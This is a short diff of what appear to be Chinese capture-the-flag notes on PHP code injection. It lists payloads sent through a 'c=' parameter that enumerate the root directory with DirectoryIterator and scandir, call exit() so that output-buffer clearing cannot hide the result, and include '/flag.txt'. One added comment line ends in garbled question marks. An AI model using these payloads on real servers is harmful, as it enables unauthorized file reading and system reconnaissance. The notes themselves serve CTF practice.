@@ -31,7 +31,8 @@ c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString().
 
 c=$a=scandir("/");foreach($a as $key=>$value){echo $key."=>".$value;}
 
-c=var_export(scandir('/'));exit(); //停掉后面的限制函数如ob_end_clean()会清除缓冲不会输出内容。
+c=var_export(scandir('/'));exit(); 
+//停掉后面的限制函数如ob_end_clean()会清除缓冲不会输出内容。会输出很多???????????
 c=include('/flag.txt');die();
 ```
 ```
